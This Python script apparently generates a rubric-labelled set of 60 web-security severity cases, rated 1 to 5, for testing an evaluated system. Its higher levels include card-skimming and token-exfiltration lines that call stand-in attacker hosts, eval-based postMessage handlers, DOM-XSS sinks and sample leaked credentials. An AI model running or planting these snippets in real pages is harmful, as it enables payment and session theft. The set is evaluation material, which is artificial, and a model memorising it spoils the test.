"""Generates new severity cases (1-5) from sev_rubric.md, with the label decided BEFORE the
content. No case is shown to CT0 before its label exists (resolves EVIDENCE Sec51).

Covers the 16 classes of the cai-lite checklist, several per level (the old set, sev_probes.json,
had only 1 scenario per level). Script kept in this same folder -- it is not meant to be discarded.
"""
import json, os

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(os.path.dirname(HERE), "sev_cases_v2_raw.json")

# Each item: (level, class, state). The level and the class are chosen first (list heading);
# the `state` is written afterwards to fit the rubric criterion. No computation uses CT0 here.
CASES = [
    # ---------------------------------------------------------------- level 1: no risk
    (1, "static-page", "<section><h2>Store Hours</h2><ul><li>Mon-Fri 9am-6pm</li><li>Sat 10am-4pm</li><li>Sun closed</li></ul></section>"),
    (1, "static-page", "<article><h2>Our Return Policy</h2><p>Items may be returned within 30 days with a receipt.</p></article>"),
    (1, "static-page", "<div class='faq'><h3>Do you ship internationally?</h3><p>Currently we only ship within the continental US.</p></div>"),
    (1, "cookies", "document.cookie = 'theme=dark; path=/; SameSite=Lax'"),
    (1, "csp-misconfig", "Content-Security-Policy: default-src 'self'; img-src 'self' data:; base-uri 'self'  // response header, tightest policy seen on this site"),
    (1, "supply-chain", "<script src='/vendor/jquery-3.7.1.min.js' integrity='sha384-abc123' crossorigin='anonymous'></script>"),
    (1, "iframe-sandbox", "<iframe src='/widgets/map.html' sandbox='allow-scripts' title='store map'></iframe>"),
    (1, "info-disclosure", "<!-- build: v2.4.1 -->\n<footer>Version 2.4.1</footer>"),
    (1, "forms", "<form action='/feedback' method='get'><label>Rating <select name='stars'><option>1</option><option>5</option></select></label></form>"),
    (1, "links", "<a href='https://partner.example.com' target='_blank' rel='noopener noreferrer'>Our partner</a>"),
    (1, "postmessage", "// no postMessage usage anywhere on this page"),
    (1, "dom-xss", "document.getElementById('clock').textContent = new Date().toLocaleTimeString()"),

    # ---------------------------------------------------------------- level 2: theoretical/minimal risk
    (2, "csp-misconfig", "<!-- no CSP header set, but page is fully static with no third-party scripts -->\n<p>Static brochure page.</p>"),
    (2, "links", "<a href='https://blog.example.com/post/42' target='_blank'>Read more</a>"),
    (2, "cookies", "document.cookie = 'lang=en; path=/'"),
    (2, "supply-chain", "<link rel='stylesheet' href='https://fonts.googleapis.com/css2?family=Inter'>  // third-party stylesheet, no SRI, but a static font file from a major vendor"),
    (2, "iframe-sandbox", "<iframe src='https://www.youtube.com/embed/dQw4w9WgXcQ'></iframe>"),
    (2, "forms", "<form action='/newsletter' method='post'><input name='email' type='email'><button>Subscribe</button></form>"),
    (2, "info-disclosure", "Server: nginx\nX-Powered-By: Express"),
    (2, "postmessage", "window.addEventListener('message', e => console.log('got', e.data))"),
    (2, "dom-clobbering", "<form id='config'><input name='action'></form>\n<script>if (window.config.action) {}</script>"),
    (2, "secret-scan", "// placeholder, replace with real key before deploy\nconst API_KEY = 'YOUR_KEY_HERE'"),
    (2, "error-disclosure", "<p>Something went wrong. Please try again later.</p>"),
    (2, "open-redirect", "<a href='/go?to=/dashboard'>Continue</a>"),

    # ---------------------------------------------------------------- level 3: moderate
    (3, "forms", "<form action='http://intranet.corp.local/timesheet' method='post'><input name='hours' type='number'></form>  // internal timesheet tool, plain HTTP, LAN-only by firewall policy"),
    (3, "csp-misconfig", "Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' https://*.analytics-vendor.example  // report-only mode, broad script-src but not yet enforced"),
    (3, "open-redirect", "app.get('/go', (req,res) => res.redirect(req.query.next || '/'))"),
    (3, "links", "<a href='javascript:void(0)' onclick='window.open(this.dataset.url)' data-url='/report/42'>View report</a>"),
    (3, "iframe-sandbox", "<iframe src='/legacy/widget.html'></iframe>"),
    (3, "cookies", "document.cookie = 'session_hint=guest; path=/'"),
    (3, "error-disclosure", "Error: ENOENT, no such file or directory '/srv/app/config/local.json'"),
    (3, "dom-clobbering", "<a id='redirectUrl' href='/safe'></a>\n<script>location.href = window.redirectUrl.href</script>"),
    (3, "postmessage", "parent.postMessage({type:'resize', height: document.body.scrollHeight}, '*')"),
    (3, "supply-chain", "<script src='https://cdn.jsdelivr.net/npm/some-lib@latest/dist/lib.min.js'></script>"),
    (3, "info-disclosure", "<!-- TODO: remove before prod, debug=true in staging config.json -->"),
    (3, "secret-scan", "const INTERNAL_HOST = 'http://10.20.0.5:8080'  // internal only, not secret but not public"),

    # ---------------------------------------------------------------- level 4: serious
    (4, "secret-scan", "SENDGRID_API_KEY=SG.r9Xk2pQmT.v7LjN4wE8sYbC1dF6hJ3kM5oP9rT2uV // found in a client-visible .env.production bundled into the JS"),
    (4, "dom-xss", "const params = new URLSearchParams(location.search)\ndocument.getElementById('out').innerHTML = params.get('msg')"),
    (4, "cookies", "res.cookie('session', token, { secure: true })  // missing httpOnly, session token in a readable cookie"),
    (4, "open-redirect", "app.get('/go', (req,res) => res.redirect(req.query.next))  // unvalidated external redirect, phished in prod"),
    (4, "insecure-forms", "<form action='http://checkout.example.com/pay' method='post'><input name='card_number'></form>"),
    (4, "postmessage", "window.addEventListener('message', e => { eval(e.data.cmd) })"),
    (4, "info-disclosure", "X-Powered-By: Express\nStack: Error at /srv/app/db.js:42\n  at Connection (pg-pool@3.6.1)\n  DATABASE_URL=postgres://admin:***@10.0.0.9/prod"),
    (4, "supply-chain", "<script src='http://cdn.example.com/widget.js'></script>  <!-- loaded over plain HTTP, no integrity -->"),
    (4, "dom-clobbering", "<img name='config'>\n<script>fetch(window.config || '/default')</script>"),
    (4, "csp-misconfig", "Content-Security-Policy: script-src * 'unsafe-inline'; object-src 'none'  // script-src wide open, object-src locked (no PoC confirmed yet, but the gap is clearly exploitable)"),
    (4, "error-disclosure", "Traceback (most recent call last):\n  File \"/srv/app/auth.py\", line 88\nAuthError: user admin password hash b'$2b$12$KIX...' did not match"),
    (4, "iframe-sandbox", "<iframe src='https://partner-widget.example/checkout' allow='payment'></iframe>  <!-- no sandbox, handles payment -->"),

    # ---------------------------------------------------------------- level 5: critical
    (5, "exfil-egress", "new Image().src = 'https://log-aggregator.ru.example/i.gif?u=' + btoa(JSON.stringify({card: cardNumber.value, exp: expiry.value}))  // confirmed firing on the live checkout page"),
    (5, "exfil-egress", "fetch('https://attacker.example/exfil', { method: 'POST', body: JSON.stringify({cc: form.card.value, cvv: form.cvv.value}) })"),
    (5, "secret-scan", "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n// committed to the public repo, still active in prod"),
    (5, "dom-xss", "document.write(decodeURIComponent(location.hash.slice(1)))  // confirmed: reflects <script>fetch('//evil.ex/'+document.cookie)</script> live"),
    (5, "open-redirect", "Observed in the wild: /go?next=https://acme-login.evil-phish.example (active phishing campaign using this redirect)"),
    (5, "insecure-forms", "app.get('/admin/users', (req,res) => res.json(allUsers))  // no auth check at all, returns full user table with password hashes"),
    (5, "postmessage", "window.addEventListener('message', e => { document.getElementById('app').innerHTML = e.data.html })  // confirmed exploited: injected iframe took over session"),
    (5, "exfil-egress", "setInterval(() => fetch('https://metrics-collector.ru/beacon', {method:'POST', body: localStorage.getItem('auth_token')}), 5000)"),
    (5, "secret-scan", "mysql -h prod-db.internal -u root -p'R00tP@ssw0rd2024!' acme_production  // found in a public gist, database is internet-facing"),
    (5, "dom-clobbering", "<form id='__proto__'><input name='isAdmin' value='true'></form>\n<script>if (user.isAdmin) grantAdminPanel()</script>  // confirmed: anonymous visitor got admin panel"),
    (5, "csp-misconfig", "<meta http-equiv='Content-Security-Policy' content=\"script-src * 'unsafe-inline' 'unsafe-eval'\">  // combined with a reflected param, gives working XSS-to-session-theft"),
    (5, "error-disclosure", "Fatal error: Uncaught Error: SSH key loaded: -----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB...  // full private key leaked in a crash dump endpoint"),
]

assert len(CASES) >= 60, "minimum coverage: 12 per level"
by_level = {}
for lvl, cls, state in CASES:
    by_level.setdefault(lvl, []).append(cls)
for lvl in range(1, 6):
    assert len(by_level.get(lvl, [])) >= 10, "level %d has too few cases (%d)" % (lvl, len(by_level.get(lvl, [])))
    assert len(set(by_level[lvl])) >= 6, "level %d has too little class diversity (%d classes)" % (lvl, len(set(by_level[lvl])))

out = [{"i": i, "sev": lvl, "class": cls, "state": state} for i, (lvl, cls, state) in enumerate(CASES)]
json.dump(out, open(OUT, "w"), indent=1)
print("wrote", len(out), "cases to", OUT)
for lvl in range(1, 6):
    n = sum(1 for c in out if c["sev"] == lvl)
    classes = sorted(set(c["class"] for c in out if c["sev"] == lvl))
    print(" level %d: %d cases, %d classes (%s)" % (lvl, n, len(classes), ", ".join(classes)))

